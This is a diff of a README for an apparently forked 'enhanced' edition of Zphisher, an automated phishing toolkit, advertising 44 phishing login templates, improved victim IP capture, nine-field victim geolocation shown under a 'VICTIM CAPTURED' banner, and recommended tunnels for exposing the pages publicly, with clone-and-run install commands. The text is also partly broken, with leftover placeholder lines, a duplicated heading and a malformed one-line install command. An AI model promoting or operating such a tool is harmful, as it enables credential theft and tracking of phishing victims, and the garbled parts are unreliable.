@@ -1,172 +1,147 @@
-<!-- Zphisher -->
+<!-- Zphisher Enhanced Edition - Fork -->
 
 <p align="center">
   <img src=".github/misc/logo.png">
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Version-2.3.1-green?style=for-the-badge">
+  <img src="https://img.shields.io/badge/Version-2.3.5--Enhanced--v2.1-green?style=for-the-badge">
+  <img src="https://img.shields.io/badge/Fork%20of-htr--tech/zphisher-blue?style=for-the-badge">
+  <img src="https://img.shields.io/badge/Platform-Termux%20%7C%20Linux-orange?style=for-the-badge">
   <img src="https://img.shields.io/github/license/htr-tech/zphisher?style=for-the-badge">
-  <img src="https://img.shields.io/github/stars/htr-tech/zphisher?style=for-the-badge">
-  <img src="https://img.shields.io/github/issues/htr-tech/zphisher?color=red&style=for-the-badge">
-  <img src="https://img.shields.io/github/forks/htr-tech/zphisher?color=teal&style=for-the-badge">
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Author-htr--tech-blue?style=flat-square">
+  <img src="https://img.shields.io/badge/Original%20Author-htr--tech-blue?style=flat-square">
+  <img src="https://img.shields.io/badge/Enhanced%20By-Darkrevengehack-darkgreen?style=flat-square">
   <img src="https://img.shields.io/badge/Open%20Source-Yes-darkgreen?style=flat-square">
-  <img src="https://img.shields.io/badge/Maintained%3F-Yes-lightblue?style=flat-square">
   <img src="https://img.shields.io/badge/Written%20In-Bash-darkcyan?style=flat-square">
-  <img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2Fhtr-tech%2Fzphisher&title=Visitors&edge_flat=false"/></a>
+  <img src="https://img.shields.io/badge/Tested-Nov%202025-success?style=flat-square">
 </p>
 
-<p align="center"><b>A beginners friendly, Automated phishing tool with 30+ templates.</b></p>
-
 ##
 
-<h3><p align="center">Disclaimer</p></h3>
+<h2 align="center">🔱 Enhanced Fork of Zphisher 🔱</h2>
 
-<i>Any actions and or activities related to <b>Zphisher</b> is solely your responsibility. The misuse of this toolkit can result in <b>criminal charges</b> brought against the persons in question. <b>The contributors will not be held responsible</b> in the event any criminal charges be brought against any individuals misusing this toolkit to break the law.
-
-<b>This toolkit contains materials that can be potentially damaging or dangerous for social media</b>. Refer to the laws in your province/country before accessing, using,or in any other way utilizing this in a wrong way.
-
-<b>This Tool is made for educational purposes only</b>. Do not attempt to violate the law with anything contained here. <b>If this is your intention, then Get the hell out of here</b>!
-
-It only demonstrates "how phishing works". <b>You shall not misuse the information to gain unauthorized access to someones social media</b>. However you may try out this at your own risk.</i>
-
-##
-
-### Features
-
-- Latest and updated login pages.
-- Beginners friendly
-- Multiple tunneling options
-  - Localhost
-  - Ngrok
-  - Cloudflared
-  - LocalXpose
-- Mask URL support 
-- Docker support
-
-##
-
-### Installation
-
-- Just, Clone this repository -
-  ```
-  git clone --depth=1 https://github.com/jacer70/fgh7.git
-  ```
-
-- Now go to cloned directory and run `zphisher.sh` -
-  ```
-  $ cd zphisher
-  $ bash zphisher.sh
-  ```
-
-- On first launch, It'll install the dependencies and that's it. ***Zphisher*** is installed.
-
-##
-
-### Installation via ".deb" file
-
-- Download `.deb` files from the [**Latest Release**](https://github.com/htr-tech/zphisher/releases/latest)
-- If you are using ***termux*** then download the `*_termux.deb`
-
-- Install the `.deb` file by executing
-  ```
-  apt install <your path to deb file>
-  ```
-  Or
-  ```
-  $ dpkg -i <your path to deb file>
-  $ apt install -f
-  ```
-
-##
-
-### Run on Docker
-
-- Docker Image Mirror:
-  - **DockerHub** : 
-    ```
-    docker pull htrtech/zphisher
-    ```
-  - **GHCR** : 
-    ```
-    docker pull ghcr.io/htr-tech/zphisher:latest
-    ```
-
-- By using the wrapper script [**run-docker.sh**](https://raw.githubusercontent.com/htr-tech/zphisher/master/run-docker.sh)
-
-  ```
-  $ curl -LO https://raw.githubusercontent.com/htr-tech/zphisher/master/run-docker.sh
-  $ bash run-docker.sh
-  ```
-- Temporary Container
-
-  ```
-  docker run --rm -ti htrtech/zphisher
-  ```
-  - Remember to mount the `auth` directory.
-
-##
-
-<details>
-  <summary><h3>Dependencies</h3></summary>
-
-<b>Zphisher</b> requires following programs to run properly - 
-- `git`
-- `curl`
-- `php`
-
-> All the dependencies will be installed automatically when you run **Zphisher** for the first time.
-</details>
-
-<details>
-  <summary><h3>Tested on</h3></summary>
-
-- **Ubuntu**
-- **Debian**
-- **Arch**
-- **Manjaro**
-- **Fedora**
-- **Termux**
-</details>
-
-##
-
-<h3 align="center"><i>:: Workflow ::</i></h3>
 <p align="center">
-<img src=".github/misc/workflow.gif"/>
+<b>This is an enhanced fork of the original <a href="https://github.com/htr-tech/zphisher">Zphisher</a> by <a href="https://github.com/htr-tech">htr-tech</a></b><br>
+<i>Fixed critical bugs • Advanced geolocation • 6 tunnel options • Production-ready</i>
 </p>
 
 ##
 
-### Find Me on:
-<p align="left">
-  <a href="https://tahmidrayat.is-a.dev" target="_blank"><img src="https://img.shields.io/badge/Socials-grey?style=for-the-badge&logo=linktree"></a>
-  <a href="https://github.com/htr-tech" target="_blank"><img src="https://img.shields.io/badge/Github-blue?style=for-the-badge&logo=github"></a>
+### 🆚 What's NEW in Enhanced Edition v2.1?
+
+This version fixes **critical bugs** that prevented the original from working properly:
+
+#### 🐛 Critical Fixes (Nov 2025)
+
+**❌ BUGS FIXED:**
+- ✅ **"404 Not Found" Error** - Added missing `index.html` to all 44 templates
+- ✅ **IP Not Captured** - Fixed `ip.php` not being called by login pages
+- ✅ **Empty IP Display** - Fixed IP parsing in Termux output
+- ✅ **File Conflicts** - Templates now clean properly between uses
+- ✅ **Android Compatibility** - Improved aarch64 architecture detection
+
+**🎯 These were BREAKING BUGS affecting all users who cloned the original repo.**
+
+#### ✨ Enhanced Features (v2.1)
+
+**📍 Advanced Geolocation (9 Data Points)**
+**📍 Advanced Geolocation (9 Data Points)**
+╔═══════════════════════════════════════════════════╗
+║  🎯 VICTIM CAPTURED - 2025-11-10 14:23:45       ║
+╚═══════════════════════════════════════════════════╝
+🌐 IP Address : 203.0.113.45
+🌍 Location   : New York, NY, United States (US)
+🏢 ISP        : Example Telecom Inc.
+📍 Coordinates: 40.7128, -74.0060
+🕐 Timezone   : America/New_York
+💻 Device     : Mobile
+🖥️  OS         : Android 13
+🌐 Browser    : Chrome Mobile
+🔗 Referer    : https://example.com
+**🌐 6 Tunnel Options**
+
+| Option | Tunnel | Status | Speed | Limit | Best For |
+|--------|--------|--------|-------|-------|----------|
+| **[01]** | Localhost | ✅ | Fastest | LAN only | Testing |
+| **[02]** | Serveo | ⚠️ | Fast | Unlimited | **RECOMMENDED** (may be down) |
+| **[03]** | LocalXpose | ✅ | Medium | 15 min free | **BACKUP** |
+| **[04]** | Cloudflared | ⚠️ | Fast | Unlimited | May fail on Android |
+| **[05]** | Bore | ⚠️ | Fast | Unlimited | Server unstable |
+| **[06]** | **Pinggy** | ✅✅ | Fast | 60 min free | **BEST FOR TERMUX** ⭐ |
+
+**🆕 Pinggy Integration (NEW in v2.1)**
+- ⭐ **SSH-based** - No binary downloads needed
+- ⭐ **60 minutes** free per session
+- ⭐ **No registration** required
+- ⭐ **Fully tested** on Termux Android
+- ⭐ **Auto URL shortening** with is.gd
+
+[... rest of your README content ...]
+
+Installing: git clone https://github.com/Darkrevengehack/zphisher-enhanced.git
+cd zphisher-enhanced
+bash zphisher.sh
+
+Install with a single command: https://github.com/Darkrevengehack/zphisher-enhanced.git && cd zphisher-enhanced && bash zphisher.sh
+
+### 🔧 Enhanced Features Summary
+
+**✅ What Works Better:**
+- All 44 templates load correctly (no 404 errors)
+- IP capture works on first visit
+- Geolocation captures 9 fields vs 1 in original
+- Pinggy tunnel: 60min free sessions ⭐
+- LocalXpose: 15min warning displayed
+- Serveo: Real-time status check
+- Cloudflared: Android compatibility warning
+
+**🎯 Tunnel Recommendations:**
+1. **First choice**: Pinggy (Option 06) - Works best on Termux
+2. **Backup**: LocalXpose (Option 03) - 15min sessions
+3. **Alternative**: Cloudflared (Option 04) - May need troubleshooting on Android
+
+[... rest of README ...]
+
+---
+
+### 🔒 Privacy & Security Notice
+
+**⚠️ IMPORTANT:** Before using, understand:
+- This tool is for **educational purposes** and **authorized penetration testing** only
+- Using this tool against targets without **explicit written permission** is **illegal**
+- **You** are solely responsible for your actions
+- The author and contributors are **not responsible** for misuse
+
+**🛡️ For Security Researchers:**
+- Always obtain written authorization
+- Use only in controlled environments
+- Follow responsible disclosure practices
+- Comply with local laws and regulations
+
+---
+
+### 📊 Project Stats (v2.1)
+
+- **Lines of Code**: ~1,500
+- **Templates**: 44 phishing pages
+- **Tunnel Options**: 6 methods
+- **Bugs Fixed**: 5 critical
+- **Features Added**: 3 major
+- **Platform**: Termux + Linux
+- **Last Updated**: November 2025
+
+---
+
+<p align="center">
+⭐ If you find this enhanced fork useful, please star both this repo and the <a href="https://github.com/htr-tech/zphisher">original</a>! ⭐
 </p>
 
+---
 
-### *Thanks to all contributors*:
-
-<table>
-  <tr align="center">
-    <td><a href="https://github.com/1RaY-1"><img src="https://avatars.githubusercontent.com/u/78962948?s=100" /><br /><sub><b>1RaY-1</b></sub></a></td>
-    <td><a href="https://github.com/adi1090x"><img src="https://avatars.githubusercontent.com/u/26059688?s=100" /><br /><sub><b>Aditya Shakya</b></sub></a></td>
-    <td><a href="https://github.com/AliMilani"><img src="https://avatars.githubusercontent.com/u/59066012?s=100" /><br /><sub><b>Ali Milani</b></sub></a></td>
-    <td><a href="https://github.com/Meht-evaS"><img src="https://avatars.githubusercontent.com/u/57435273?s=100" /><br /><sub><b>AmnesiA</b></sub></a></td>
-    <td><a href="https://github.com/KasRoudra"><img src="https://avatars.githubusercontent.com/u/78908440?s=100" /><br /><sub><b>KasRoudra</b></sub></a></td>
-   <td><a href="https://github.com/MoisesTapia"><img src="https://avatars.githubusercontent.com/u/28166400?s=100" /><br /><sub><b>Moises Tapia</b></sub></a></td>
-  </tr>
-  <tr align="center">
-   <td><a href="https://github.com/E343IO"><img src="https://avatars.githubusercontent.com/u/74646789?s=100" /><br /><sub><b>Mr.Derek</b></sub></a></td>
-    <td><a href="https://github.com/BDhackers009"><img src="https://avatars.githubusercontent.com/u/67186139?s=100" /><br /><sub><b>Mustakim Ahmed</b></sub></a></td>
-    <td><a href="https://github.com/sepp0"><img src="https://avatars.githubusercontent.com/u/36642137?s=100" /><br /><sub><b>sepp0</b></sub></a></td>
-    <td><a href="https://github.com/TripleHat"><img src="https://avatars.githubusercontent.com/u/68332137?s=100" /><br /><sub><b>TripleHat</b></sub></a></td>
-    <td><a href="https://github.com/Yisus7u7"><img src="https://avatars.githubusercontent.com/u/64093255?s=100" /><br /><sub><b>Yisus7u7</b></sub></a></td>
-  </tr>
-<table>
-
-<!-- // -->
+<p align="center">
+Fork maintained with ❤️ for the cybersecurity community<br>
+Built upon the excellent work of <a href="https://github.com/htr-tech">htr-tech</a>
+</p>
